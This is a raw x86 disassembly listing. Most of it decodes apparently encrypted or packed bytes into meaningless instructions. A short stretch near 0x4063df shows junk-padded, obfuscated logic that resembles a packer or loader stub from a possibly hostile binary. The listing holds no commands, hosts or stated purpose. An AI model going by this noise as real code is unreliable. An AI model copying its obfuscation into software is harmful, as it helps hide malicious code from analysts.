  4060b9:	jmp    0x40608d
  4060bb:	mov    esp,0xc3b7d2d2
  4060c0:	rol    bh,0xb0
  4060c3:	mov    cl,0xc4
  4060c5:	in     eax,0xd8
  4060c7:	cld    
  4060c8:	sti    
  4060c9:	jecxz  0x4060b2
  4060cb:	(bad)  
  4060cc:	mov    eax,0xb03d3e6
  4060d1:	call   0xda4f30ae
  4060d6:	leave  
  4060d7:	rol    DWORD PTR [ecx+eax*8],cl
  4060da:	rcr    bh,1
  4060dc:	out    dx,eax
  4060dd:	loope  0x4060ca
  4060df:	leave  
  4060e0:	shl    cl,0xba
  4060e3:	(bad)
  4060e6:	idiv   ebx
  4060e8:	into   
  4060e9:	jecxz  0x4060cc
  4060eb:	rcr    edi,cl
  4060ed:	in     al,dx
  4060ee:	add    dh,bh
  4060f0:	fmul   QWORD PTR [ebx]
  4060f2:	(bad)  
  4060f3:	call   0xfe2d66fe
  4060f8:	shr    BYTE PTR [edi-0xf432856],cl
  4060fe:	out    dx,eax
  4060ff:	cli    
  406100:	mov    ch,0xd9
  406102:	icebp  
  406103:	div    DWORD PTR [edi+0x2c3dbd3]
  406109:	rol    al,1
  40610b:	ret    0x506
  40610e:	shl    dl,1
  406110:	cli    
  406111:	hlt    
  406112:	retf   
  406113:	fmulp  st(3),st
  406115:	in     eax,0x1
  406117:	in     eax,0x0
  406119:	test   eax,0xf3bce6e7
  40611e:	shl    dl,cl
  406120:	mov    bh,0xe5
  406122:	out    dx,eax
  406123:	lods   eax,DWORD PTR ds:[esi]
  406124:	aam    0xc9
  406126:	(bad)  
  406127:	add    edi,esp
  406129:	(bad)  
  40612b:	jecxz  0x4060fa
  40612d:	in     eax,dx
  40612e:	std    
  40612f:	add    eax,edi
  406131:	(bad)  
  406132:	out    0xfb,eax
  406134:	or     bl,bh
  406136:	fcmovb st,st(1)
  406138:	int3   
  406139:	in     eax,dx
  40613a:	lods   al,BYTE PTR ds:[esi]
  40613b:	out    0xd5,al
  40613d:	jecxz  0x4060ec
  40613f:	in     eax,0xb0
  406141:	aad    0xc6
  406143:	fdivrp st(0),st
  406145:	cld    
  406146:	shl    ebx,1
  406148:	enter  0xe0d0,0xda
  40614c:	icebp  
  40614d:	(bad)  
  40614f:	test   ebx,0xd800ca05
  406155:	clc    
  406156:	into   
  406157:	push   es
  406158:	push   es
  406159:	ret    0xbdde
  40615c:	in     al,0xe8
  40615e:	in     al,0xfb
  406160:	xlat   BYTE PTR ds:[ebx]
  406161:	icebp  
  406162:	repz mov ebx,0xebf4ebb8
  406168:	out    dx,eax
  406169:	fdivr  DWORD PTR [ebp-0x230c0241]
  40616f:	test   esi,0xe3dfd9d8
  406175:	loope  0x406160
  406177:	loopne 0x406177
  406179:	lods   al,BYTE PTR ds:[esi]
  40617a:	(bad)  
  40617b:	loope  0x406168
  40617d:	xlat   BYTE PTR ds:[ebx]
  40617e:	mov    bl,0xf0
  406180:	mov    ch,0xd3
  406182:	sti    
  406183:	int3   
  406184:	hlt    
  406185:	clc    
  406186:	(bad)  
  406188:	fadd   DWORD PTR [ebx]
  40618a:	int    0xe7
  40618c:	mov    edi,0xebf2f3de
  406191:	ret    
  406192:	jmp    0x40619e
  406194:	loopne 0x406194
  406196:	push   es
  406197:	cli    
  406198:	adc    ebp,esp
  40619a:	in     eax,0xf3
  40619c:	sar    DWORD PTR [eax+esi*4-0x4e14572a],cl
  4061a3:	(bad)
  4061a6:	dec    bh
  4061a8:	fmulp  st(6),st
  4061aa:	ret    0x3e0
  4061ad:	(bad)
  4061b0:	rol    ebp,1
  4061b2:	loope  0x4061ad
  4061b4:	jmp    edx
  4061b6:	or     dl,ah
  4061b8:	jmp    0xf6f013a5
  4061bd:	ret    
  4061be:	loope  0x4061a3
  4061c0:	out    0xc7,eax
  4061c2:	icebp  
  4061c3:	(bad)  
  4061c4:	jmp    0xdd041a9b
  4061c9:	rcl    ecx,cl
  4061cb:	icebp  
  4061cc:	loop   0x4061c2
  4061ce:	(bad)  
  4061cf:	in     al,0xfb
  4061d1:	add    eax,esi
  4061d3:	in     al,0xce
  4061d5:	aam    0xdb
  4061d7:	loope  0x4061d1
  4061d9:	fxch   st(3)
  4061db:	sar    BYTE PTR [esi-0x33092931],0xb1
  4061e2:	mov    dh,0xc6
  4061e4:	in     eax,dx
  4061e5:	mov    esi,0xdccefbbd
  4061ea:	lock test ebx,0xd7d307e5
  4061f1:	lds    ecx,FWORD PTR [edi]
  4061f3:	(bad)  
  4061f5:	(bad)  
  4061f6:	into   
  4061f7:	clc    
  4061f8:	ffree  st(1)
  4061fa:	ret    
  4061fb:	mov    edi,0xe9d4dceb
  406200:	test   esi,0xdcffb5d8
  406206:	rcl    dl,1
  406208:	retf   0xd602
  40620b:	(bad)  
  40620d:	hlt    
  40620e:	aam    0xdd
  406210:	icebp  
  406211:	aam    0xc0
  406213:	fmul   st,st(2)
  406215:	add    al,0xee
  406217:	fcom   DWORD PTR [ebx]
  406219:	test   eax,0xc3c1a8c8
  40621e:	leave  
  40621f:	test   esp,0xf8d4f4c4
  406225:	div    bl
  406227:	leave  
  406228:	mov    edi,0xbe01b9e0
  40622d:	xlat   BYTE PTR ds:[ebx]
  40622e:	aad    0xe2
  406230:	(bad)  
  406231:	jmp    0x40621d
  406233:	in     eax,0x5
  406235:	fsubp  st(3),st
  406237:	loopne 0x406245
  406239:	mov    eax,0xddc8cce7
  40623e:	lock aam 0xe1
  406241:	out    dx,al
  406242:	call   0xb6fb293b
  406247:	iret   
  406248:	lock out dx,al
  40624a:	loope  0x406246
  40624c:	aad    0xd6
  40624e:	cld    
  40624f:	(bad)  
  406250:	(bad)  
  406251:	idiv   ch
  406253:	add    ch,dl
  406255:	cld    
  406256:	fild   DWORD PTR [eax]
  406258:	out    0xc5,al
  40625a:	mov    dl,0xac
  40625c:	mov    bl,0xdc
  40625e:	mov    cl,0xd2
  406260:	(bad)  
  406261:	not    edi
  406263:	shl    esi,1
  406265:	leave  
  406266:	fucom  st(3)
  406268:	ret    
  406269:	test   ebp,0xe3e7bdfd
  40626f:	(bad)
  406272:	jmp    0xf3424e66
  406277:	stc    
  406278:	leave  
  406279:	mov    dl,0xc8
  40627b:	scas   eax,DWORD PTR es:[edi]
  40627c:	scas   eax,DWORD PTR es:[edi]
  40627d:	rol    edx,0xc8
  406280:	div    BYTE PTR [ebp-0x2a354828]
  406286:	(bad)  
  406288:	mov    edi,0xe3c2f6fe
  40628d:	jecxz  0x40626a
  40628f:	(bad)  
  406290:	or     ecx,ecx
  406292:	out    0xe9,eax
  406294:	enter  0xbec,0xe2
  406298:	int3   
  406299:	enter  0xafc6,0xbc
  40629d:	shl    DWORD PTR [ebp+ecx*8-0x36262a1c],0xc4
  4062a5:	int    0xba
  4062a7:	shl    DWORD PTR [eax-0x242c121d],cl
  4062ad:	in     al,dx
  4062ae:	add    al,0xbc
  4062b0:	retf   0xe5d7
  4062b3:	out    0xe4,eax
  4062b5:	paddq  mm3,mm5
  4062b8:	cli    
  4062b9:	fucom  st(6)
  4062bb:	mov    cl,0xa4
  4062bd:	mov    esp,0xfbc5cdd6
  4062c2:	enter  0xd3ca,0xf3
  4062c6:	fucomip st,st(3)
  4062c8:	fld    DWORD PTR [ebx]
  4062ca:	mov    ecx,0xe0dfc6f9
  4062cf:	mul    eax
  4062d1:	fdivp  st(7),st
  4062d3:	add    cl,bl
  4062d5:	loop   0x4062d7
  4062d7:	(bad)  
  4062da:	out    0xf6,al
  4062dc:	retf   
  4062dd:	leave  
  4062de:	fmul   st(0),st
  4062e0:	retf   0xe9c5
  4062e3:	lock hlt 
  4062e5:	rcl    ecx,cl
  4062e7:	fdivr  st,st(2)
  4062e9:	ret    
  4062ea:	fcmove st,st(6)
  4062ec:	idiv   DWORD PTR [esi+0x9f9f2e6]
  4062f2:	std    
  4062f3:	loop   0x4062c4
  4062f5:	(bad)  
  4062f7:	add    dh,ah
  4062f9:	int    0xd2
  4062fb:	loop   0x4062b3
  4062fd:	retf   0xc8e2
  406300:	mul    ah
  406302:	idiv   DWORD PTR [edi-0x2c364933]
  406308:	fmul   st(4),st
  40630a:	neg    ebx
  40630c:	aam    0xdb
  40630e:	jecxz  0x4062e2
  406310:	loope  0x4062f2
  406312:	cmc    
  406313:	cli    
  406314:	out    dx,eax
  406315:	add    esp,eax
  406317:	inc    DWORD PTR [esi]
  406319:	out    0xea,al
  40631b:	loopne 0x406314
  40631d:	stos   DWORD PTR es:[edi],eax
  40631e:	mov    ah,0xb5
  406320:	lds    esi,FWORD PTR [eax-0x23444613]
  406326:	mov    ch,0xf2
  406328:	loop   0x406327
  40632a:	repnz in eax,dx
  40632c:	int    0xc6
  40632e:	rcr    bl,1
  406330:	test   BYTE PTR [edx],0xfa
  406333:	or     bh,ch
  406335:	loopne 0x406326
  406337:	add    BYTE PTR [edx],cl
  406339:	jmp    0x406317
  40633b:	mov    cl,0xf0
  40633d:	mul    esp
  40633f:	mov    cl,0xeb
  406341:	mov    ah,0xb0
  406343:	xlat   BYTE PTR ds:[ebx]
  406344:	lock mov ah,0xbe
  406347:	out    dx,al
  406348:	mov    al,0xcd
  40634a:	repnz cmc 
  40634c:	pop    es
  40634d:	idiv   ecx
  40634f:	lock shl cl,cl
  406352:	(bad)  
  406353:	stc    
  406354:	loope  0x40631d
  406356:	add    eax,DWORD PTR ds:0xd3c1c2ce
  40635c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635d:	scas   eax,DWORD PTR es:[edi]
  40635e:	ror    ecx,1
  406360:	into   
  406361:	(bad)  
  406362:	out    0xf1,al
  406364:	mov    edx,0xbcd0c8cb
  406369:	aad    0xc3
  40636b:	pop    es
  40636c:	in     eax,0xec
  40636e:	clc    
  40636f:	out    0x3,al
  406371:	retf   
  406372:	call   0xda355c6d
  406377:	retf   
  406378:	out    dx,eax
  406379:	lods   eax,DWORD PTR ds:[esi]
  40637a:	(bad)  
  40637b:	mov    edi,0xe7cdebe1
  406380:	out    0xec,al
  406382:	fxch   st(2)
  406384:	iret   
  406385:	(bad)  
  406386:	cli    
  406387:	mov    ah,0xdf
  406389:	xlat   BYTE PTR ds:[ebx]
  40638a:	clc    
  40638b:	mov    ch,0xbc
  40638d:	repz add edi,DWORD PTR [esp+eax*1-0x293bfbf7]
  406395:	out    0xdc,al
  406397:	loop   0x4063a8
  406399:	(bad)  
  40639a:	retf   0xaee8
  40639d:	repnz in al,0xc3
  4063a0:	shl    ecx,1
  4063a2:	fcmovu st,st(2)
  4063a4:	leave  
  4063a5:	sar    ecx,1
  4063a7:	mov    esi,0xf4c303f6
  4063ac:	ret    0xe2c0
  4063af:	add    ecx,DWORD PTR [ebx]
  4063b1:	loope  0x40637e
  4063b3:	or     cl,cl
  4063b5:	(bad)  
  4063b7:	jmp    0xc42c2496
  4063bc:	(bad)  
  4063bd:	int3   
  4063be:	mov    bl,0xc1
  4063c0:	jmp    0xf20050b5
  4063c5:	cmc    
  4063c6:	in     al,dx
  4063c7:	rcl    ecx,cl
  4063c9:	sti    
  4063ca:	(bad)  
  4063cb:	mov    esp,0xc606c1f4
  4063d0:	rcr    bl,1
  4063d2:	test   DWORD PTR [edi],0xe7cbdfc6
  4063d8:	add    ch,al
  4063da:	jmp    0x56915062
  4063df:	mov    DWORD PTR [ebp-0x4],0x437423
  4063e6:	dec    DWORD PTR ds:0x43771f
  4063ec:	mov    DWORD PTR [ebp-0x8],0x43742b
  4063f3:	or     DWORD PTR ds:0x437767,0x43777f
  4063fd:	lea    eax,[ebp-0x18]
  406400:	inc    DWORD PTR ds:0x4377a3
  406406:	mov    DWORD PTR [ebp-0xc],eax
  406409:	dec    DWORD PTR ds:0x43772b
  40640f:	mov    eax,DWORD PTR [ebp-0xc]
  406412:	mov    DWORD PTR [eax],0x70941f82
  406418:	mov    DWORD PTR [eax+0x4],0xffffffff
  40641f:	sub    eax,DWORD PTR ds:0x43770f
  406425:	mov    eax,ds:0x43739f
  40642a:	inc    DWORD PTR ds:0x43775b
  406430:	mov    eax,DWORD PTR [eax+0x1c0]
  406436:	or     DWORD PTR ds:0x4377ab,0x72ba
  406440:	mov    eax,DWORD PTR [eax]
  406442:	sub    DWORD PTR ds:0x437763,0x437723
  40644c:	xor    ecx,ecx
  40644e:	sbb    DWORD PTR ds:0x43779f,0x733b
  406458:	sub    eax,0x5424137
  40645d:	mov    DWORD PTR ds:0x4377a3,0x54e3
  406467:	sbb    ecx,0x0
  40646a:	xor    eax,0x8a29a14b
  40646f:	xor    ecx,0x0
  406472:	mov    DWORD PTR ds:0x43779f,0x3ce1
  40647c:	mov    DWORD PTR [ebp-0x20],eax
  40647f:	mov    DWORD PTR [ebp-0x1c],ecx
  406482:	mov    DWORD PTR ds:0x43777f,0x5274
  40648c:	cmp    DWORD PTR [ebp-0x20],0x70941f81
  406493:	jne    0x4089fc
  406499:	mov    DWORD PTR ds:0x437743,0x6c71
  4064a3:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4064a7:	jne    0x4089fc
  4064ad:	sbb    DWORD PTR ds:0x43778b,edx
  4064b3:	mov    eax,DWORD PTR [ebp-0x8]
  4064b6:	and    DWORD PTR ds:0x437753,0x437727
  4064c0:	mov    eax,DWORD PTR [eax]
  4064c2:	xor    ecx,ecx
  4064c4:	sub    eax,0x5424137
  4064c9:	jmp    0x408817
  4064ce:	mov    ds:0xf452acdf,al
  4064d3:	push   eax
  4064d4:	outs   dx,DWORD PTR fs:[esi]
  4064d6:	jbe    0x406527
  4064d8:	loope  0x406479
  4064da:	lock in eax,dx
  4064dc:	mov    eax,0x7bbdd964
  4064e1:	jnp    0x40648d
  4064e3:	cwde   
  4064e4:	jnp    0x406561
  4064e6:	jmp    0xc5265ab3
  4064eb:	loopne 0x4064e2
  4064ed:	loopne 0x4064a0
  4064ef:	lock cld 
  4064f1:	(bad)  
  4064f3:	mov    eax,0xd7d9becd
  4064f8:	add    eax,0x9ebd1d1
  4064fd:	pop    es
  4064fe:	retf   
  4064ff:	jecxz  0x4064da
  406501:	in     eax,0xc5
  406503:	iret   
  406504:	in     eax,0xf7
  406506:	jecxz  0x4064e4
  406508:	(bad)  
  406509:	out    dx,eax
  40650a:	in     al,dx
  40650b:	test   al,0xe9
  40650d:	clc    
  40650e:	sar    dl,cl
  406510:	out    dx,eax
  406511:	mov    esi,0xf4fac9f4
  406516:	fsub   st,st(3)
  406518:	add    ah,dl
  40651a:	or     esi,edi
  40651c:	(bad)  
  40651d:	cli    
  40651e:	out    0xd5,eax
  406520:	enter  0xb0b,0xf
  406524:	int3   
  406525:	jmp    0xc4b0:0xb6f7eed1
  40652c:	iret   
  40652d:	out    0xff,eax
  40652f:	aad    0xb4
  406531:	jmp    0xdced:0xe0f2c3f3
  406538:	aad    0xe5
  40653a:	call   ebp
  40653c:	(bad)
  40653f:	or     eax,0xe8e0e1e4
  406544:	loopne 0x406519
  406546:	retf   0xe9e1
  406549:	shl    ch,cl
  40654b:	mov    edx,0xb8bbdaeb
  406550:	(bad)  
  406551:	repz jmp 0xf6c1:0xd7d1b7f8
  406559:	loopne 0x406539
  40655b:	mov    ch,0xe7
  40655e:	loope  0x406524
  406560:	or     BYTE PTR [ecx],cl
  406562:	or     BYTE PTR [eax],cl
  406564:	(bad)  
  406566:	(bad)  
  406567:	(bad)  
  406569:	(bad)  
  40656a:	in     al,0xda
  40656c:	mov    al,0xed
  40656e:	mov    bh,0xb9
  406570:	in     eax,dx
  406571:	into   
  406572:	fidivr WORD PTR [ebx-0x313f4902]
  406578:	icebp  
  406579:	add    eax,0xdbc1cad0
  40657e:	loop   0x40658e
  406580:	jmp    0xc9263e87
  406585:	out    0xc0,eax
  406587:	lods   eax,DWORD PTR ds:[esi]
  406588:	retf   0xc4e4
  40658b:	stc    
  40658c:	repnz mov edx,0xdbb3bed7
  406592:	mov    eax,0x2cfdbdd
  406597:	int    0xd1
  406599:	ret    0xbc04
  40659c:	or     bl,cl
  40659e:	rcr    cl,0xcd
  4065a1:	loopne 0x406572
  4065a3:	add    ebp,ebx
  4065a5:	out    0xe0,al
  4065a7:	mov    ebp,0xeed5e6e1
  4065ac:	jmp    0xcdf8:0xe4f9ebd3
  4065b3:	jecxz  0x406576
  4065b5:	call   edi
  4065b7:	out    dx,al
  4065b8:	(bad)  
  4065ba:	out    0xc6,al
  4065bc:	les    eax,FWORD PTR [esi]
  4065be:	jecxz  0x4065b9
  4065c0:	fld    st(2)
  4065c2:	or     bh,dl
  4065c4:	jmp    0x4065a7
  4065c6:	lods   eax,DWORD PTR ds:[esi]
  4065c7:	(bad)
  4065ca:	in     al,0xd7
  4065cc:	clc    
  4065cd:	out    0xca,al
  4065cf:	ror    edx,1
  4065d1:	shr    ebx,cl
  4065d3:	(bad)  
  4065d4:	std    
  4065d5:	add    al,BYTE PTR [ecx]
  4065d7:	add    esp,esi
  4065d9:	loopne 0x4065d1
  4065db:	add    al,0xd6
  4065dd:	or     edi,edi
  4065df:	out    dx,al
  4065e0:	(bad)  
  4065e1:	std    
  4065e2:	in     eax,0xf9
  4065e4:	mov    bl,0xb0
  4065e6:	mov    bh,0xe4
  4065e8:	scas   eax,DWORD PTR es:[edi]
  4065e9:	(bad)
  4065ec:	lock (bad) 
  4065ee:	mov    cl,0xc9
  4065f0:	fdivr  st(6),st
  4065f2:	out    dx,al
  4065f3:	loop   0x4065ca
  4065f5:	mov    ebp,0xecfddb
  4065fa:	add    al,0xc3
  4065fc:	mov    ah,0xe
  4065ff:	pmuludq mm4,mm4
  406602:	(bad)
  406605:	jmp    0xb5d6:0xf7bcc1d6
  40660c:	mov    bh,0xc0
  40660e:	int    0xec
  406610:	rcl    esi,cl
  406612:	mov    edi,0xbdd1f3e1
  406617:	std    
  406618:	out    0xdd,al
  40661a:	inc    esi
  40661c:	pop    es
  40661d:	add    al,cl
  40661f:	iret   
  406620:	fucom  st(4)
  406622:	add    eax,DWORD PTR [ebp*8-0x28330822]
  406629:	loop   0x406626
  40662b:	fucomi st,st(4)
  40662d:	out    dx,al
  40662e:	shr    ecx,cl
  406630:	ror    bl,cl
  406632:	sti    
  406633:	(bad)  
  406634:	mov    ebx,0xd7e5f4f0
  406639:	rol    DWORD PTR [ebx],1
  40663b:	add    bl,bl
  40663d:	cli    
  40663e:	clc    
  40663f:	std    
  406640:	loopne 0x40662b
  406642:	in     eax,dx
  406643:	jmp    0xc3f5:0xb0e1e7e7
  40664a:	int3   
  40664b:	jmp    0xcef8:0xc9eec0ef
  406652:	mov    ch,0xba
  406654:	sar    ebp,0xc3
  406657:	in     eax,0xc5
  406659:	out    0xe4,al
  40665b:	imul   eax
  40665d:	in     al,0xff
  40665f:	cli    
  406660:	loop   0x40666d
  406662:	or     al,0xee
  406664:	fld    st(2)
  406666:	repz in eax,dx
  406668:	scas   eax,DWORD PTR es:[edi]
  406669:	shl    BYTE PTR [esi-0x25452912],1
  40666f:	fnstsw WORD PTR [ebx-0x42134603]
  406675:	not    edx
  406677:	test   DWORD PTR [ebx],0xe6d7e6da
  40667d:	or     ecx,DWORD PTR [esi]
  40667f:	cli    
  406680:	push   es
  406681:	or     esp,edx
  406683:	push   es
  406684:	mov    cl,0xc7
  406686:	int    0xde
  406688:	imul   dh
  40668a:	(bad)  
  40668b:	out    dx,eax
  40668c:	(bad)  
  40668d:	call   0xfb3d454b
  406692:	mov    ecx,0xefbde903
  406697:	out    0xe7,eax
  406699:	(bad)  
  40669a:	out    0xf0,eax
  40669c:	push   es
  40669d:	(bad)  
  40669e:	or     bl,ah
  4066a0:	out    dx,eax
  4066a1:	clc    
  4066a2:	sti    
  4066a3:	fcmovbe st,st(1)
  4066a5:	fsubrp st(7),st
  4066a7:	jecxz  0x40666a
  4066a9:	loop   0x406673
  4066ab:	mov    ch,0xb1
  4066ad:	int3   
  4066ae:	mov    bh,0xc4
  4066b0:	fsubr  st,st(1)
  4066b2:	mov    cl,0xd1
  4066b4:	jmp    edx
  4066b6:	aad    0xd9
  4066b8:	mov    esi,0xc1cbcbe1
  4066bd:	xlat   BYTE PTR ds:[ebx]
  4066be:	pop    es
  4066bf:	add    al,BYTE PTR [ebx]
  4066c1:	fcmovnu st,st(6)
  4066c3:	add    eax,0xade3ddc0
  4066c8:	loope  0x4066af
  4066ca:	sti    
  4066cb:	test   ebp,0xc9eaf3b6
  4066d1:	icebp  
  4066d2:	retf   
  4066d3:	hlt    
  4066d4:	mov    eax,0xdabcd0d6
  4066d9:	vshufps ymm0,ymm3,YMMWORD PTR [edx],0xca
  4066de:	add    eax,0xc903dfed
  4066e3:	loopne 0x4066d4
  4066e5:	retf   
  4066e6:	icebp  
  4066e7:	shl    bh,1
  4066e9:	ret    0xf9bb
  4066ec:	mov    dl,0xe5
  4066ee:	sar    al,cl
  4066f0:	retf   
  4066f1:	jmp    0xbe02:0xdbcffe02
  4066f8:	add    dl,dl
  4066fa:	add    al,dh
  4066fc:	pop    es
  4066fd:	retf   
  4066fe:	retf   0xc6cb
  406701:	mov    BYTE PTR [ecx+ebp*8],0xe7
  406705:	mov    cl,0xcc
  406707:	jmp    0xc0d0:0xe8e6d1c4
  40670e:	mov    ch,0xf2
  406710:	jmp    0xfbfd350d
  406715:	add    esi,edx
  406717:	std    
  406718:	loope  0x406720
  40671a:	(bad)
  40671d:	mov    esi,0xdee2d9c5
  406722:	(bad)  
  406724:	mov    dl,0xe5
  406726:	(bad)  
  406727:	scas   al,BYTE PTR es:[edi]
  406728:	int3   
  406729:	(bad)  
  40672a:	call   0xc63456db
  40672f:	xlat   BYTE PTR ds:[ebx]
  406730:	in     eax,0xb2
  406732:	fadd   QWORD PTR [ebx]
  406734:	cli    
  406735:	fcmovnb st,st(1)
  406737:	cli    
  406738:	add    eax,0xe1c4c507
  40673d:	(bad)  
  40673e:	iret   
  40673f:	(bad)  
  406741:	cli    
  406742:	into   
  406743:	repz jmp 0x406738
  406746:	jecxz  0x4066f8
  406748:	jmp    0xd0f4:0xd5eabbd6
  40674f:	shr    cl,cl
  406751:	mov    edx,0xccc2d9f9
  406756:	push   ecx
  406758:	aam    0xfb
  40675a:	lock (bad) 
  40675c:	(bad)  
  40675e:	mul    edx
  406760:	(bad)  
  406761:	or     eax,0xaed9e209
  406766:	jmp    0x406733
  406768:	aad    0xcd
  40676a:	in     eax,0xe1
  40676c:	out    0xf1,al
  40676e:	fidiv  WORD PTR [eax-0x1d2c0002]
  406774:	add    ebp,eax
  406776:	int3   
  406777:	rcr    ebp,cl
  406779:	loop   0x40673c
  40677b:	(bad)  
  40677c:	jecxz  0x406756
  40677e:	xlat   BYTE PTR ds:[ebx]
  40677f:	iret   
  406780:	stc    
  406781:	or     al,0xfe
  406783:	inc    dl
  406785:	into   
  406786:	loop   0x406751
  406788:	xlat   BYTE PTR ds:[ebx]
  406789:	int    0xcc
  40678b:	shl    BYTE PTR [eax-0x1b243226],1
  406791:	in     eax,dx
  406792:	mov    edx,0xf903c8d4
  406797:	aam    0xfa
  406799:	out    0xe0,al
  40679b:	stc    
  40679c:	or     al,BYTE PTR [edi]
  40679e:	in     al,0xc0
  4067a0:	fucompp 
  4067a2:	add    al,0x5
  4067a4:	stos   BYTE PTR es:[edi],al
  4067a5:	fmulp  st(4),st
  4067a7:	jmp    0xcfb5:0xf0b5d1c8
  4067ae:	aam    0xb7
  4067b0:	(bad)  
  4067b1:	sti    
  4067b2:	sti    
  4067b3:	std    
  4067b4:	sti    
  4067b5:	add    bh,BYTE PTR [eax-0xdfd3300]
  4067bb:	inc    ah
  4067bd:	in     al,0xe2
  4067bf:	loope  0x4067cc
  4067c1:	jmp    esp
  4067c3:	repz into 
  4067c5:	mov    al,0xf7
  4067c7:	fucom  st(2)
  4067c9:	shl    ebp,cl
  4067cb:	jmp    0xe8d3:0xb8f8ccd7
  4067d2:	add    edi,edx
  4067d4:	loope  0x4067a5
  4067d6:	push   es
  4067d7:	icebp  
  4067d8:	rol    esi,0xe2
  4067db:	mov    ebp,0xf5daf5e5
  4067e1:	or     al,0xfe
  4067e3:	in     al,dx
  4067e4:	ror    edi,1
  4067e6:	in     al,0xb7
  4067e8:	loope  0x4067be
  4067ea:	rol    esi,1
  4067ec:	mov    al,0xc7
  4067ee:	jmp    0x4067ba
  4067f0:	mov    ebp,0xcecfcaf3
  4067f5:	mov    ebp,0xfde5ccc1
  4067fa:	(bad)  
  4067fb:	icebp  
  4067fc:	mov    edi,0xc900d907
  406801:	(bad)
  406804:	lock scas eax,DWORD PTR es:[edi]
  406806:	fmulp  st(1),st
  406808:	(bad)
  40680b:	xlat   BYTE PTR ds:[ebx]
  40680c:	mov    cl,0xc7
  40680e:	lods   eax,DWORD PTR ds:[esi]
  40680f:	mov    al,0xca
  406811:	int    0xc8
  406813:	mov    al,0xfb
  406815:	mov    esp,0xf4d5f7fc
  40681a:	add    al,0xcb
  40681c:	mov    edi,0x6fa01d9
  406821:	ret    0xffc
  406824:	loope  0x4067d2
  406826:	out    dx,eax
  406827:	xlat   BYTE PTR ds:[ebx]
  406828:	rcl    eax,0xd7
  40682b:	fnstcw WORD PTR [edx-0xc292b1b]
  406831:	std    
  406832:	loop   0x4067ec
  406834:	fild   DWORD PTR [edx]
  406836:	add    dl,bh
  406838:	add    bh,al
  40683a:	hlt    
  40683b:	mov    esp,0x5d7c9d6
  406840:	(bad)  
  406841:	fst    QWORD PTR [ebx]
  406843:	or     eax,0xc1c4aaa9
  406848:	jmp    0xf2f0:0xb4e5f5b7
  40684f:	mov    ebx,0xddbfb8b5
  406854:	mov    ebx,0xfef3cfdd
  406859:	hlt    
  40685a:	stc    
  40685b:	or     esi,esi
  40685d:	in     eax,0xc4
  40685f:	cmc    
  406860:	(bad)  
  406861:	jmp    0xcbec7663
  406866:	mov    bl,0xe2
  406868:	iret   
  406869:	call   0xf00c4953
  40686e:	(bad)  
  40686f:	mov    ah,0xfd
  406871:	mov    ebp,0xefdfd1ec
  406876:	pop    es
  406877:	aam    0x5
  406879:	sti    
  40687a:	jmp    0xdeee:0x9dbc3d6
  406881:	aam    0xe9
  406883:	repnz mov esi,0xc5e1a5b2
  406889:	repz loopne 0x406855
  40688c:	lock fxtract 
  40688f:	(bad)  
  406891:	cli    
  406892:	dec    edi
  406894:	int    0xd8
  406896:	out    0xbe,eax
  406898:	in     eax,dx
  406899:	mov    ebp,0xe3d9d1f8
  40689e:	loope  0x406882
  4068a0:	int    0xd9
  4068a2:	loope  0x4068b5
  4068a4:	jmp    0x406862
  4068a6:	mov    dl,0xb7
  4068a8:	(bad)
  4068ab:	lock jmp 0x136775
  4068b1:	jmp    0xf2c0:0xedd6d3d9
  4068b8:	fcomp  st(2)
  4068ba:	mov    ecx,0xd80afcc5
  4068bf:	add    eax,0xe0ddbde
  4068c4:	mov    eax,0xe7e9c9e6
  4068c9:	icebp  
  4068ca:	loop   0x406890
  4068cc:	mov    al,0xda
  4068ce:	clc    
  4068cf:	mov    eax,0xd8c3d5bf
  4068d4:	fst    st(2)
  4068d6:	(bad)  
  4068d7:	into   
  4068d8:	add    esi,esi
  4068da:	add    eax,0x4ffc4fe
  4068df:	add    esp,ebp
  4068e1:	add    al,ah
  4068e3:	loop   0x4068be
  4068e5:	fucomip st,st(5)
  4068e7:	shl    ecx,1
  4068e9:	stos   BYTE PTR es:[edi],al
  4068ea:	fcmovb st,st(4)
  4068ec:	mov    bl,0xd1
  4068ee:	int    0xeb
  4068f0:	(bad)  
  4068f2:	rcr    eax,1
  4068f4:	mov    ebp,0xfbfaf9bd
  4068f9:	mov    edx,0xc7c1e5da
  4068fe:	jecxz  0x4068d8
  406900:	add    cl,bl
  406902:	rcr    edi,0xcb
  406905:	in     al,0xbd
  406907:	out    0xc4,eax
  406909:	loopne 0x4068da
  40690b:	in     al,dx
  40690c:	mov    bh,0xbb
  40690e:	mov    cl,0xb5
  406910:	int    0xbc
  406912:	cli    
  406913:	(bad)  
  406915:	in     eax,dx
  406916:	mov    ebp,0xe2d30706
  40691b:	icebp  
  40691c:	(bad)  
  40691d:	sar    dh,1
  40691f:	or     eax,0xc0cfdd00
  406924:	stos   DWORD PTR es:[edi],eax
  406925:	lods   al,BYTE PTR ds:[esi]
  406926:	mov    al,0xe2
  406928:	call   0xb0f324da
  40692d:	scas   al,BYTE PTR es:[edi]
  40692e:	mov    ah,0xdb
  406930:	rcl    bl,cl
  406932:	jmp    0xe1dc:0xcfe0d2fc
  406939:	sar    BYTE PTR [esp+esi*8-0x25391439],1
  406940:	in     al,dx
  406941:	(bad)  
  406942:	in     eax,dx
  406943:	jmp    0xdcea:0xe0a9bdc9
  40694a:	enter  0xbbd1,0xcd
  40694e:	(bad)  
  406950:	fmulp  st(7),st
  406952:	jecxz  0x406911
  406954:	rol    BYTE PTR [eax],1
  406956:	repz out 0xdf,eax
  406959:	lock (bad) 
  40695b:	cld    
  40695c:	clc    
  40695d:	out    dx,eax
  40695e:	test   BYTE PTR [ecx+ebp*8],0xe
  406962:	(bad)
  406965:	(bad)  
  406967:	mov    esi,0xeeb4c0ae
  40696c:	rol    esp,cl
  40696e:	retf   0xbfff
  406971:	stc    
  406972:	cmc    
  406973:	(bad)  
  406975:	stc    
  406976:	fcmovnbe st,st(6)
  406978:	fdivrp st(5),st
  40697a:	repnz or eax,DWORD PTR [ebx]
  40697d:	out    0x1,eax
  40697f:	push   cs
  406980:	ret    
  406981:	(bad)  
  406983:	stc    
  406984:	stos   BYTE PTR es:[edi],al
  406985:	test   eax,0xd5cac6ea
  40698a:	neg    cl
  40698c:	int3   
  40698d:	sar    DWORD PTR [edx-0x3714002e],1
  406993:	(bad)  
  406994:	hlt    
  406995:	out    dx,eax
  406996:	add    cl,ah
  406998:	add    al,0xde
  40699a:	loop   0x406954
  40699c:	add    eax,0xd5d408da
